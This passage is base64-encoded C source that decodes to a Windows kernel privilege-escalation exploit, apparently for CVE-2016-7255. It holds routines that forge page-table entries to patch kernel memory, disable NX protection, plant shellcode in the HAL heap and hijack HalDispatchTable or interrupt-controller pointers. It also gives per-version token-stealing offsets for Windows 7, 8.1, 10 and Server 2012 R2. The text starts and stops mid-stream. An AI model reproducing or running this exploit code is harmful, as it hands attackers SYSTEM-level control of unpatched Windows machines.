lzaWNhbCBhZGRyZXNzIG9mIHBtbDRlCQ0KCVVJTlQ2NCBwbWw0ZV9wZm4gPSAoVUlOVDY0KSgqKFBWT0lEICopcG1sNGUpOw0KCXByaW50ZigiWytdIENvbnRlbnQgcG1sNGUgJWxseDogJWxseFxuIiwgcG1sNGUsIHBtbDRlX3Bmbik7DQoJLy8gQ2hhbmdlIHRoZSBQeEUNCglwbWw0ZV9wZm4gPSBwbWw0ZV9wZm4gfCAweDY3OyAvLyBTZXQgVS9TDQoJDQoJcHJpbnRmKCJbK10gUGF0Y2hpbmcgdGhlIFNwdXJpb3VzIE9mZnNldCAoUE1MNGUpICVsbHg6ICVsbHhcbiIsZl9lX3BtbDQsIHBtbDRlX3Bmbik7DQoJKigoUFZPSUQgKilzcHVyaW91c19vZmZzZXQpID0gKFBWT0lEKXBtbDRlX3BmbjsNCglTbGVlcCgweDEpOyAvLyBTbGVlcCBmb3IgVExCIHJlZnJlc2g7DQoJDQoJLy9SZWFkIHRoZSBwaHlzaWNhbCBhZGRyZXNzIG9mIHBkcHRlDQoJVUlOVDY0IHBkcHRlX3BmbiA9IChVSU5UNjQpICooUFZPSUQgKikoc3B1cmlvdXNfcHQgKyBwZHB0ZV9vZmZzZXQpOw0KCXByaW50ZigiWytdIENvbnRlbnQgcGRwdGUgJWxseDogJWxseFxuIiwgcGRwdGUsIHBkcHRlX3Bmbik7DQoJLy8gQ2hhbmdlIHRoZSBQeEUNCglwZHB0ZV9wZm4gPSBwZHB0ZV9wZm4gfCAweDY3OyAvLyBTZXQgVS9TDQoJcHJpbnRmKCJbK10gUGF0Y2hpbmcgdGhlIFNwdXJpb3VzIE9mZnNldCAoUERQVEUpICVsbHg6ICVsbHhcbiIsIHNwdXJpb3VzX29mZnNldCwgcGRwdGVfcGZuKTsNCgkqKChQVk9JRCAqKXNwdXJpb3VzX29mZnNldCkgPSAoUFZPSUQpcGRwdGVfcGZuOw0KCVNsZWVwKDB4MSk7IC8vIFNsZWVwIGZvciBUTEIgcmVmcmVzaDsNCgkNCgkvL1JlYWQgdGhlIHBoeXNpY2FsIGFkZHJlc3Mgb2YgcGRlDQoJVUlOVDY0IHBkZV9hZGRyID0gc3B1cmlvdXNfcHQgKyBwZGVfb2Zmc2V0Ow0KCVVJTlQ2NCBwZGVfcGZuID0gKFVJTlQ2NCkgKihQVk9JRCAqKShzcHVyaW91c19wdCArIHBkZV9vZmZzZXQpOw0KCXByaW50ZigiWytdIENvbnRlbnQgcGRwZSAlbGx4OiAlbGx4XG4iLCBwZGUsIHBkZV9wZm4pOw0KCS8vIENoYW5nZSB0aGUgUHhFDQoJcGRlX3BmbiA9IHBkZV9wZm4gfCAweDY3OyAvLyBTZXQgVS9TDQoJcHJpbnRmKCJbK10gUGF0Y2hpbmcgdGhlIFNwdXJpb3VzIE9mZnNldCAoUERFKSAlbGx4OiAlbGx4XG4iLCBzcHVyaW91c19vZmZzZXQsIHBkZV9wZm4pOw0KCSooKFBWT0lEICopc3B1cmlvdXNfb2Zmc2V0KSA9IChQVk9JRClwZGVfcGZuOw0KCVNsZWVwKDB4MSk7IC8vIFNsZWVwIGZvciBUTEIgcmVmcmVzaDsNCgkNCgkvL1JlYWQgdGhlIHBoeXNpY2FsIGFkZHJlc3Mgb2YgcHRlDQoJVUlOVDY0IHB0ZV9hZGRyID0gc3B1cmlvdXNfcHQgKyBwdGVfb2Zmc2V0Ow0KCVVJTlQ2NCBwdGVfcGZuID0gKFVJTlQ2NCkgKihQVk9JRCAqKShzcHVyaW91c19wdCArIHB0ZV9vZmZzZXQpOw0KCXByaW50ZigiWytdIENvbnRlbnQgcHRlICVsbHg6ICVsbHhcbiIsIHB0ZSwgcHRlX3Bmbik7DQoJLy8gQ2hhbmdlIHRoZSBQeEUNCglwdGVfcGZuID0gcHRlX3BmbiB8IDB4Njc7IC8vIFNldCBVL1MNCiAgICBwdGVfcGZuID0gcHRlX3BmbiAmIDB4N2ZmZmZmZmZmZmZmZmZmZjsgLy8gVHVybiBvZmYgTlggICANCglpZiAocGF0Y2hfb3JpZ2luYWwpIHsNCgkJcHJpbnRmKCIqKiogUGF0Y2hpbmcgdGhlIG9yaWdpbmFsIGxvY2F0aW9uIHRvIGVuYWJsZSBOWC4uLlxuIik7DQoJCSooUFZPSUQgKikoc3B1cmlvdXNfcHQgKyBwdGVfb2Zmc2V0KSA9IChQVk9JRClwdGVfcGZuOw0KCX0NCiANCglwcmludGYoIlsrXSBQYXRjaGluZyB0aGUgU3B1cmlvdXMgT2Zmc2V0IChQVEUpICVsbHg6ICVsbHhcbiIsIHNwdXJpb3VzX29mZnNldCwgcHRlX3Bmbik7DQoJKigoUFZPSUQgKilzcHVyaW91c19vZmZzZXQpID0gKFBWT0lEKXB0ZV9wZm47DQoJU2xlZXAoMHgxKTsgLy8gU2xlZXAgZm9yIFRMQiByZWZyZXNoOw0KCXByaW50ZigiXG5cbiIpOw0KCXJldHVybiBzcHVyaW91c19wdDsNCn0NCg0KVUlOVDY0IGdldF9PdmVyd3JpdGVBZGRyZXNzX3BvaW50ZXIoVUlOVDY0IHRhcmdldF9hZGRyZXNzLCBpbnQgdGFyZ2V0X29mZnNldCkgew0KCXByaW50ZigiWypdIEdldHRpbmcgT3ZlcndyaXRlIHBvaW50ZXI6ICVsbHhcbiIsIHRhcmdldF9hZGRyZXNzKTsNCglVSU5UNjQgT3ZlcndyaXRlQWRkcmVzcyA9IGNyZWF0ZV9zcHVyaW91c19wdGVfdG9fdmlydHVhbF9hZGRyZXNzKHRhcmdldF9hZGRyZXNzLCBGQUxTRSk7DQoJT3ZlcndyaXRlQWRkcmVzcyArPSAodGFyZ2V0X2FkZHJlc3MgJiAweEZGRik7DQoJcHJpbnRmKCJPdmVyd3JpdGVBZGRyZXNzOiAlbGx4XG4iLCBPdmVyd3JpdGVBZGRyZXNzKTsNCglyZXR1cm4gKFVJTlQ2NCkgKigoUFZPSUQgKikoKChjaGFyICopT3ZlcndyaXRlQWRkcmVzcykgKyB0YXJnZXRfb2Zmc2V0KSk7DQp9DQoNCnZvaWQgb3ZlcndyaXRlX1RhcmdldEFkZHJlc3MoVUlOVDY0IGhvb2tfYWRkcmVzcywgVUlOVDY0IHRhcmdldF9hZGRyZXNzLCBpbnQgdGFyZ2V0X29mZnNldCkgew0KCVVJTlQ2NCBPdmVyd3JpdGVUYXJnZXQgPSBjcmVhdGVfc3B1cmlvdXNfcHRlX3RvX3ZpcnR1YWxfYWRkcmVzcyh0YXJnZXRfYWRkcmVzcywgRkFMU0UpOw0KCU92ZXJ3cml0ZVRhcmdldCArPSAodGFyZ2V0X2FkZHJlc3MgJiAweEZGRik7DQoJVUlOVDY0IHRhcmdldCA9IChVSU5UNjQpKChjaGFyICopT3ZlcndyaXRlVGFyZ2V0KSArIHRhcmdldF9vZmZzZXQ7DQoJcHJpbnRmKCJQYXRjaCBPdmVyd3JpdGVUYXJnZXQ6ICVsbHggd2l0aCAlbGx4XG4iLCB0YXJnZXQsIGhvb2tfYWRkcmVzcyk7DQoJKihQVk9JRCAqKXRhcmdldCA9IChQVk9JRClob29rX2FkZHJlc3M7DQp9DQoNCg0KVUlOVDY0IHN0b3JlX3NoZWxsY29kZV9pbl9oYWwodm9pZCkgew0KCS8vLy8gRmluYWxseSBzdG9yZSB0aGUgc2hlbGxjb2RlIG9uIHRoZSBIQUwNCg0KCVVJTlQ2NCBoYWxfaGVhcF9hZGRyID0gMHhGRkZGRkZGRkZGRDAwMDAwOw0KCVVJTlQ2NCBoYWxfaGVhcCA9IGNyZWF0ZV9zcHVyaW91c19wdGVfdG9fdmlydHVhbF9hZGRyZXNzKGhhbF9oZWFwX2FkZHIsIFRSVUUpOw0KDQoJcHJpbnRmKCJIQUwgYWRkcmVzczogJWxseFxuIiwgaGFsX2hlYXApOw0KCS8vIDB4ZmZmZmZmZmZmZmQwMGQ1MCB0aGlzIGlzIGEgZ29vZCBvZmZzZXQgdG8gc3RvcmUgc2hlbGxjb2RlIA0KCS8vIDB4ZmZmIC0gMHhkNTAgPSAweDJhZiBzcGFjZQ0KDQoJbWVtY3B5KCgoY2hhciAqKWhhbF9oZWFwKSArIDB4ZDUwLCBzaGVsbGNvZGUsIHNpemVvZihzaGVsbGNvZGUpKTsNCglyZXR1cm4gMHhmZmZmZmZmZmZmZDAwZDUwOw0KfQ0KDQpVSU5UNjQgR2V0SGFsRGlzcGF0Y2hUYWJsZSgpIHsNCiAgICBQQ0hBUiBLZXJuZWxJbWFnZTsNCiAgICBTSVpFX1QgUmV0dXJuTGVuZ3RoOw0KICAgIEhNT0RVTEUgaE50RGxsID0gTlVMTDsNCiAgICBVSU5UNjQgSGFsRGlzcGF0Y2hUYWJsZTsNCiAgICBITU9EVUxFIGhLZXJuZWxJblVzZXJNb2RlID0gTlVMTDsNCiAgICBQVk9JRCBLZXJuZWxCYXNlQWRkcmVzc0luS2VybmVsTW9kZTsNCiAgICBOVFNUQVRVUyBOdFN0YXR1cyA9IFNUQVRVU19VTlNVQ0NFU1NGVUw7DQogICAgUFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04gcFN5c3RlbU1vZHVsZUluZm9ybWF0aW9uOw0KDQogICAgaE50RGxsID0gTG9hZExpYnJhcnkoIm50ZGxsLmRsbCIpOw0KDQogICAgaWYgKCFoTnREbGwpIHsNCiAgICAgICAgcHJpbnRmKCJcdFx0XHRbLV0gRmFpbGVkIFRvIExvYWQgTnREbGwuZGxsOiAweCVYXG4iLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIGV4aXQoRVhJVF9GQUlMVVJFKTsNCiAgICB9DQoNCiAgICBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24gPSAoTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uX3QpR2V0UHJvY0FkZHJlc3MoaE50RGxsLCAiTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uIik7DQoNCiAgICBpZiAoIU50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbikgew0KICAgICAgICBwcmludGYoIlx0XHRcdFstXSBGYWlsZWQgUmVzb2x2aW5nIE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbjogMHglWFxuIiwgR2V0TGFzdEVycm9yKCkpOw0KICAgICAgICBleGl0KEVYSVRfRkFJTFVSRSk7DQogICAgfQ0KDQogICAgTnRTdGF0dXMgPSBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24oU3lzdGVtTW9kdWxlSW5mb3JtYXRpb24sIE5VTEwsIDAsICZSZXR1cm5MZW5ndGgpOw0KDQogICAgLy8gQWxsb2NhdGUgdGhlIEhlYXAgY2h1bmsNCiAgICBwU3lzdGVtTW9kdWxlSW5mb3JtYXRpb24gPSAoUFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04pSGVhcEFsbG9jKEdldFByb2Nlc3NIZWFwKCksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIRUFQX1pFUk9fTUVNT1JZLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmV0dXJuTGVuZ3RoKTsNCg0KICAgIGlmICghcFN5c3RlbU1vZHVsZUluZm9ybWF0aW9uKSB7DQogICAgICAgIHByaW50ZigiXHRcdFx0Wy1dIE1lbW9yeSBBbGxvY2F0aW9uIEZhaWxlZCBGb3IgU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTjogMHglWFxuIiwgR2V0TGFzdEVycm9yKCkpOw0KICAgICAgICBleGl0KEVYSVRfRkFJTFVSRSk7DQogICAgfQ0KICAgIE50U3RhdHVzID0gTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uKFN5c3RlbU1vZHVsZUluZm9ybWF0aW9uLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBTeXN0ZW1Nb2R1bGVJbmZvcm1hdGlvbiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZXR1cm5MZW5ndGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJlJldHVybkxlbmd0aCk7DQoNCiAgICBpZiAoTnRTdGF0dXMgIT0gU1RBVFVTX1NVQ0NFU1MpIHsNCiAgICAgICAgcHJpbnRmKCJcdFx0XHRbLV0gRmFpbGVkIFRvIEdldCBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OOiAweCVYXG4iLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIGV4aXQoRVhJVF9GQUlMVVJFKTsNCiAgICB9DQoNCiAgICBLZXJuZWxCYXNlQWRkcmVzc0luS2VybmVsTW9kZSA9IHBTeXN0ZW1Nb2R1bGVJbmZvcm1hdGlvbi0+TW9kdWxlWzBdLkJhc2U7DQogICAgS2VybmVsSW1hZ2UgPSBzdHJyY2hyKChQQ0hBUikocFN5c3RlbU1vZHVsZUluZm9ybWF0aW9uLT5Nb2R1bGVbMF0uSW1hZ2VOYW1lKSwgJ1xcJykgKyAxOw0KDQogICAgcHJpbnRmKCJcdFx0XHRbK10gTG9hZGVkIEtlcm5lbDogJXNcbiIsIEtlcm5lbEltYWdlKTsNCiAgICBwcmludGYoIlx0XHRcdFsrXSBLZXJuZWwgQmFzZSBBZGRyZXNzOiAweCVwXG4iLCBLZXJuZWxCYXNlQWRkcmVzc0luS2VybmVsTW9kZSk7DQogICAgDQogICAgaEtlcm5lbEluVXNlck1vZGUgPSBMb2FkTGlicmFyeUEoS2VybmVsSW1hZ2UpOw0KDQogICAgaWYgKCFoS2VybmVsSW5Vc2VyTW9kZSkgew0KICAgICAgICBwcmludGYoIlx0XHRcdFstXSBGYWlsZWQgVG8gTG9hZCBLZXJuZWw6IDB4JVhcbiIsIEdldExhc3RFcnJvcigpKTsNCiAgICAgICAgZXhpdChFWElUX0ZBSUxVUkUpOw0KICAgIH0NCg0KICAgIC8vIFRoaXMgaXMgc3RpbGwgaW4gdXNlciBtb2RlDQogICAgSGFsRGlzcGF0Y2hUYWJsZSA9IChVSU5UNjQpR2V0UHJvY0FkZHJlc3MoaEtlcm5lbEluVXNlck1vZGUsICJIYWxEaXNwYXRjaFRhYmxlIik7DQoNCiAgICBpZiAoIUhhbERpc3BhdGNoVGFibGUpIHsNCiAgICAgICAgcHJpbnRmKCJcdFx0XHRbLV0gRmFpbGVkIFJlc29sdmluZyBIYWxEaXNwYXRjaFRhYmxlOiAweCVYXG4iLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIGV4aXQoRVhJVF9GQUlMVVJFKTsNCiAgICB9DQogICAgZWxzZSB7DQogICAgICAgIEhhbERpc3BhdGNoVGFibGUgPSAoVUxPTkdMT05HKUhhbERpc3BhdGNoVGFibGUgLSAoVUxPTkdMT05HKWhLZXJuZWxJblVzZXJNb2RlOw0KDQogICAgICAgIC8vIEhlcmUgd2UgZ2V0IHRoZSBhZGRyZXNzIG9mIEhhcERpc3BhdGNoVGFibGUgaW4gS2VybmVsIG1vZGUNCiAgICAgICAgSGFsRGlzcGF0Y2hUYWJsZSA9ICgoVUxPTkdMT05HKUhhbERpc3BhdGNoVGFibGUgKyAoVUxPTkdMT05HKUtlcm5lbEJhc2VBZGRyZXNzSW5LZXJuZWxNb2RlKTsNCiAgICAgICAgcHJpbnRmKCJcdFx0XHRbK10gSGFsRGlzcGF0Y2hUYWJsZTogMHglbGx4XG4iLCBIYWxEaXNwYXRjaFRhYmxlKTsNCiAgICB9DQoNCiAgICBIZWFwRnJlZShHZXRQcm9jZXNzSGVhcCgpLCAwLCAoTFBWT0lEKXBTeXN0ZW1Nb2R1bGVJbmZvcm1hdGlvbik7DQoNCiAgICBpZiAoaE50RGxsKSB7DQogICAgICAgIEZyZWVMaWJyYXJ5KGhOdERsbCk7DQogICAgfQ0KDQogICAgaWYgKGhLZXJuZWxJblVzZXJNb2RlKSB7DQogICAgICAgIEZyZWVMaWJyYXJ5KGhLZXJuZWxJblVzZXJNb2RlKTsNCiAgICB9DQoNCiAgICBoTnREbGwgPSBOVUxMOw0KICAgIGhLZXJuZWxJblVzZXJNb2RlID0gTlVMTDsNCiAgICBwU3lzdGVtTW9kdWxlSW5mb3JtYXRpb24gPSBOVUxMOw0KDQogICAgcmV0dXJuIEhhbERpc3BhdGNoVGFibGU7DQp9DQoNCmludCBfX2NkZWNsIG1haW4oaW50IGFyZ2MsIGNoYXIqKiBhcmd2KQ0Kew0KCVRDSEFSIHByZV91c2VybmFtZVsyNTZdOw0KCVRDSEFSIHBvc3RfdXNlcm5hbWVbMjU2XTsNCglEV09SRCBzaXplID0gMjU2Ow0KCVVMT05HIEludGVydmFsID0gMDsNCglITU9EVUxFIGhOdERsbCA9IE5VTEw7DQoJVUlOVCByZXR2YWw7DQogICAgVUlOVDY0IG92ZXJ3cml0ZV9hZGRyZXNzOw0KICAgIGludCBvdmVyd3JpdGVfb2Zmc2V0Ow0KICAgIA0KICAgIC8vIGRlZmluZSBvcGVyYXRpbmcgc3lzdGVtIHZlcnNpb24gc3BlY2lmaWMgdmFyaWFibGVzDQogICAgdW5zaWduZWQgY2hhciBzY19LUFJPQ0VTUzsNCiAgICB1bnNpZ25lZCBpbnQgc2NfVE9LRU47DQogICAgdW5zaWduZWQgaW50IHNjX0FQTElOS1M7DQoJaW50IG9zdmVyc2lvbjsNCg0KCWlmIChhcmdjICE9IDIpIHsNCgkJcHJpbnRmKCJQbGVhc2UgZW50ZXIgYW4gT1MgdmVyc2lvblxuIik7DQoJCXByaW50ZigiVGhlIGZvbGxvd2luZyBPUydlcyBhcmUgc3VwcG9ydGVkOlxuIik7DQoJCXByaW50ZigiXHRbKl0gNyAgLSBXaW5kb3dzIDdcbiIpOw0KCQlwcmludGYoIlx0WypdIDgxIC0gV2luZG93cyA4LjFcbiIpOw0KCQlwcmludGYoIlx0WypdIDEwIC0gV2luZG93cyAxMCBwcmlvciB0byBidWlsZCByZWxlYXNlIDE0MzkzIChBbm5pdmVyc2FyeSBVcGRhdGUpXG4iKTsNCgkJcHJpbnRmKCJcdFsqXSAxMiAtIFdpbmRvd3MgMjAxMiBSMlxuIik7DQoJCXByaW50ZigiXG4iKTsNCgkJcHJpbnRmKCJcdFsqXSBGb3IgZXhhbXBsZTogIGN2ZS0yMDE2LTcyNTUuZXhlIDcgICAgLS0gZm9yIFdpbmRvd3MgN1xuIik7DQoJCXJldHVybiAtMTsNCgl9DQoJDQoJb3N2ZXJzaW9uID0gX3N0cnRvdWk2NChhcmd2WzFdLCBOVUxMLCAxMCk7DQoJDQogICAgaWYob3N2ZXJzaW9uID09IDcpIA0KICAgIHsNCiAgICAgICAgLy8gdGhlIHRhcmdldCBtYWNoaW5lJ3MgT1MgaXMgV2luZG93cyA3IFNQMQ0KICAgICAgICBwcmludGYoIiAgIFsrXSBXaW5kb3dzIDcgU1AxXG4iKTsNCiAgICAgICAgc2NfS1BST0NFU1MgPSAweDcwOwkJCS8vIGR0IC1yMSBudCFfS1RIUkVBRCAgKzB4MDUwIEFwY1N0YXRlIDogX0tBUENfU1RBVEUgLT4gKzB4MDIwIFByb2Nlc3MgOiBQdHI2NCBfS1BST0NFU1MNCiAgICAgICAgc2NfVE9LRU4gICAgPSAweDgwOwkJCS8vIGR0IC1yMSBudCFfRVBST0NFU1MgWysweDIwOCBUb2tlbiA6IF9FWF9GQVNUX1JFRl0gLSBbKzB4MTg4IEFjdGl2ZVByb2Nlc3NMaW5rcyA6IF9MSVNUX0VOVFJZXSA9ICgweDgwKQ0KICAgICAgICBzY19BUExJTktTICA9IDB4MTg4OwkJLy8gZHQgLXIxIG50IV9FUFJPQ0VTUyArMHgxODggQWN0aXZlUHJvY2Vzc0xpbmtzIDogX0xJU1RfRU5UUlkNCiAgICAgICAgDQogICAgICAgIG92ZXJ3cml0ZV9hZGRyZXNzID0gR2V0SGFsRGlzcGF0Y2hUYWJsZSgpOyAgLy8gSGFsRGlzcGF0Y2hUYWJsZQ0KICAgICAgICBvdmVyd3JpdGVfb2Zmc2V0ID0gMHg4OyAgICAgIAkJCQkvLyBRdWVyeUludGVydmFsUHJvZmlsZSAgICAgICAgDQogICAgfQ0KCWVsc2UgaWYob3N2ZXJzaW9uID09IDgxKQ0KICAgIHsNCiAgICAgICAgLy8gdGhlIHRhcmdldCBtYWNoaW5lJ3MgT1MgaXMgV2luZG93cyA4LjENCiAgICAgICAgcHJpbnRmKCIgICBbK10gV2luZG93cyA4LjFcbiIpOw0KICAgICAgICBzY19LUFJPQ0VTUyA9IDB4Qjg7ICAgICAgICAgICAgIC8vIGR0IC1yMSBudCFfS1RIUkVBRCArMHgwOTggQXBjU3RhdGUgOiBfS0FQQ19TVEFURSAtPiArMHgwMjAgUHJvY2VzcyA6IFB0cjY0IF9LUFJPQ0VTUw0KICAgICAgICBzY19UT0tFTiAgICA9IDB4NjA7ICAgICAgICAgICAgIC8vIGR0IC1yMSBudCFfRVBST0NFU1MgWysweDM0OCBUb2tlbiA6IF9FWF9GQVNUX1JFRl0gLSBbKzB4MmU4IEFjdGl2ZVByb2Nlc3NMaW5rcyA6IF9MSVNUX0VOVFJZXSA9ICgweDYwKQ0KICAgICAgICBzY19BUExJTktTICA9IDB4MmU4OyAgICAgICAgIAkvLyBkdCAtcjEgbnQhX0VQUk9DRVNTICsweDJlOCBBY3RpdmVQcm9jZXNzTGlua3MgOiBfTElTVF9FTlRSWQ0KICAgICAgICANCiAgICAgICAgb3ZlcndyaXRlX2FkZHJlc3MgPSAweGZmZmZmZmZmZmZkMDA1MTA7ICAgICAvLyBIYWxwSW50ZXJydXB0Q29udHJvbGxlcl9hZGRyZXNzIChkcSBwb2koaGFsIUhhbHBJbnRlcnJ1cHRDb250cm9sbGVyKSkNCiAgICAgICAgb3ZlcndyaXRlX29mZnNldCA9IDB4Nzg7ICAgICAgICAgICAgICAgICAgICAvLyBIYWxwQXBpY1JlcXVlc3RJbnRlcnJ1cHRPZmZzZXQgKGRxIGhhbHBBcGljUmVxdWVzdEludGVycnVwdCkNCiAgICB9DQoJZWxzZSBpZihvc3ZlcnNpb24gPT0gMTApDQogICAgew0KICAgICAgICAvLyB0aGUgdGFyZ2V0IG1hY2hpbmUncyBPUyBpcyBXaW5kb3dzIDEwIHByaW9yIHRvIGJ1aWxkIDE0MzkzDQogICAgICAgIHByaW50ZigiICAgWytdIFdpbmRvd3MgMTBcbiIpOw0KICAgICAgICBzY19LUFJPQ0VTUyA9IDB4Qjg7ICAgICAgICAgICAgIC8vIGR0IC1yMSBudCFfS1RIUkVBRCArMHgwOTggQXBjU3RhdGUgOiBfS0FQQ19TVEFURSAtPiArMHgwMjAgUHJvY2VzcyA6IFB0cjY0IF9LUFJPQ0VTUw0KICAgICAgICBzY19UT0tFTiAgICA9IDB4Njg7ICAgICAgICAgICAgIC8vIGR0IC1yMSBudCFfRVBST0NFU1MgWysweDM1OCBUb2tlbiA6IF9FWF9GQVNUX1JFRl0gLSBbKzB4MmYwIEFjdGl2ZVByb2Nlc3NMaW5rcyA6IF9MSVNUX0VOVFJZXSA9ICgweDYwKQ0KICAgICAgICBzY19BUExJTktTICA9IDB4MmYwOyAgICAgICAgICAgIC8vIGR0IC1yMSBudCFfRVBST0NFU1MgKzB4MmYwIEFjdGl2ZVByb2Nlc3NMaW5rcyA6IF9MSVNUX0VOVFJZDQogICAgICAgIA0KICAgICAgICBvdmVyd3JpdGVfYWRkcmVzcyA9IDB4ZmZmZmZmZmZmZmQwMDRjMDsgICAgIC8vIEhhbHBJbnRlcnJ1cHRDb250cm9sbGVyX2FkZHJlc3MgKGRxIHBvaShoYWwhSGFscEludGVycnVwdENvbnRyb2xsZXIpDQogICAgICAgIG92ZXJ3cml0ZV9vZmZzZXQgPSAweDc4OyAgICAgICAgICAgICAgICAgICAgLy8gSGFscEFwaWNSZXF1ZXN0SW50ZXJydXB0T2Zmc2V0IChkcSBoYWxwQXBpY1JlcXVlc3RJbnRlcnJ1cHQpDQogICAgfQ0KCWVsc2UgaWYob3N2ZXJzaW9uID09IDEyKQ0KICAgIHsNCiAgICAgICAgLy8gdGhlIHRhcmdldCBtYWNoaW5lJ3MgT1MgaXMgV2luZG93cyAyMDEyIFIyDQogICAgICAgIHByaW50ZigiICAgWytdIFdpbmRvd3MgMjAxMiBSMlxuIik7DQogICAgICAgIHNjX0tQUk9DRVNTID0gMHhCODsgICAgICAgICAgICAgLy8gZHQgLXIxIG50IV9LVEhSRUFEICsweDA5OCBBcGNTdGF0ZSA6IF9LQVBDX1NUQVRFIC0+ICsweDAyMCBQcm9jZXNzIDogUHRyNjQgX0tQUk9DRVNTDQogICAgICAgIHNjX1RPS0VOICAgID0gMHg2MDsgICAgICAgICAgICAgLy8gZHQgLXIxIG50IV9FUFJPQ0VTUyBbKzB4MzQ4IFRva2VuIDogX0VYX0ZBU1RfUkVGXSAtIFsrMHgyZTggQWN0aXZlUHJvY2Vzc0xpbmtzIDogX0xJU1RfRU5UUlldID0gKDB4NjApDQogICAgICAgIHNjX0FQTElOS1MgID0gMHgyZTg7ICAgICAgICAgICAgLy8gZHQgLXIxIG50IV9FUFJPQ0VTUyArMHgyZTggQWN0aXZlUHJvY2Vzc0xpbmtzIDogX0xJU1RfRU5UUlkNCiAgICAgICAgDQogICAgICAgIG92ZXJ3cml0ZV9hZGRyZXNzID0gMHhmZmZmZmZmZmZmZDEyYzcwOyAgICAgLy8gSGFscEludGVycnVwdENvbnRyb2xsZXJfYWRkcmVzcyAoZHEgcG9pKGhhbCFIYWxwSW50ZXJydXB0Q29udHJvbGxlcikNCiAgICAgICAgb3ZlcndyaXRlX29mZnNldCA9IDB4Nzg7ICAgICAgICAgICAgICAgICAgICAvLyBIYWxwQXBpY1JlcXVlc3RJbnRlcnJ1cHRPZmZzZXQgKGRxIGhhbHBBcGljUmVxdWVzdEludGVycnVwdCkNCiAgICB9DQogICAgLy8gaW4gY2FzZSB0aGUgT1MgdmVyc2lvbiBpcyBub3QgYW55IG9mIHRoZSBwcmV2aW91c2x5IGNoZWNrZWQgdmVyc2lvbnMNCiAgICBlbHNlDQogICAgew0KICAgICAgICBwcmludGYoIiAgIFstXSBVbnN1cHBvcnRlZCB2ZXJzaW9uXG4iKTsNCiAgICAgICAgcHJpbnRmKCIgICAgICBbKl0gQWZmZWN0ZWQgNjQtYml0IG9wZXJhdGluZyBzeXN0ZW1zXG4iKTsNCiAgICAgICAgcHJpbnRmKCIgICAgICAgICBbKl0gV2luZG93cyA3IFNQMSAgICAgICAgICAgICAgICAgLS0gY3ZlLTIwMTYtNzI1NS5leGUgN1xuIik7DQoJCXByaW50ZigiICAgICAgICAgWypdIFdpbmRvd3MgOC4xICAgICAgICAgICAgICAgICAgIC0tIGN2ZS0yMDE2LTcyNTUuZXhlIDgxXG4iKTsNCgkJcHJpbnRmKCIgICAgICAgICBbKl0gV2luZG93cyAxMCBiZWZvcmUgYnVpbGQgMTQzOTMgLS0gY3ZlLTIwMTYtNzI1NS5leGUgMTBcbiIpOw0KCQlwcmludGYoIgkJIFsqXSBXaW5kb3dzIDIwMTIgUjIJCQkgICAtLSBjdmUtMjAxNi03MjU1LmV4ZSAxMlxuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgICAgIA0KCXByaW50ZigiTXkgUElEIGlzOiAlZFxuIiwgR2V0Q3VycmVudFByb2Nlc3NJZCgpKTsNCiAgICBHZXRVc2VyTmFtZShwcmVfdXNlcm5hbWUsICZzaXplKTsNCglwcmludGYoIkN1cnJlbnQgVXNlcm5hbWU6ICVzXG4iLCBwcmVfdXNlcm5hbWUpOw0KCXByaW50ZigiUE1MNCBTZWxmIFJlZjogJWxseFxuIiwgUE1MNF9TRUxGX1JFRik7DQogICAgcHJpbnRmKCJTaGVsbGNvZGUgc3RvcmVkIGF0OiAlcFxuIiwgKHZvaWQgKikgJnNoZWxsY29kZSk7DQoJcHJpbnRmKCJFbnRlciB0byBjb250aW51ZS4uLlxuIik7DQoJZ2V0Y2hhcigpOw0KDQoJZG8NCgl7DQoJCW9yX2FkZHJlc3NfdmFsdWVfNCgodm9pZCopUE1MNF9TRUxGX1JFRik7DQoJfSB3aGlsZSAoRkFMU0UpOw0KDQoJUE1MNF9TRUxGX1JFRl9JTkRFWCA9IEdFVF9JTkRFWCgoVUlOVDY0KVBNTDRfU0VMRl9SRUYpOw0KCXByaW50ZigiWypdIFNlbGYgUmVmIEluZGV4OiAleFxuIiwgUE1MNF9TRUxGX1JFRl9JTkRFWCk7DQoJUE1MNF9CQVNFID0gKChVSU5UNjQpUE1MNF9TRUxGX1JFRiAmIChVSU5UNjQpMHhGRkZGRkZGRkZGRkZGMDAwKTsNCgkNCiAgICBVSU5UNjQgb3JpZ2luYWxfcG9pbnRlciA9IGdldF9PdmVyd3JpdGVBZGRyZXNzX3BvaW50ZXIob3ZlcndyaXRlX2FkZHJlc3MsIG92ZXJ3cml0ZV9vZmZzZXQpOw0KDQoJcHJpbnRmKCJPcmlnaW5hbCBPdmVyd3JpdGVUYXJnZXQgcG9pbnRlcjogJWxseFxuIiwgb3JpZ2luYWxfcG9pbnRlcik7DQoJRFdPUkQgcGlkID0gR2V0Q3VycmVudFByb2Nlc3NJZCgpOw0KICANCiAgICAvKiBTaGVsbGNvZGUgUGF0Y2hpbmcgISEgKi8NCgljaGFyICpwID0gc2hlbGxjb2RlOw0KCXAgKz0gNDsgLy8gc2tpcCB0aGUgQ0xJLCBQVVNIRiBhbmQgTU9WIFJBWCBieXRlcwkNCgkqKFBWT0lEICopcCA9IChQVk9JRClvcmlnaW5hbF9wb2ludGVyOyAvLyBQYXR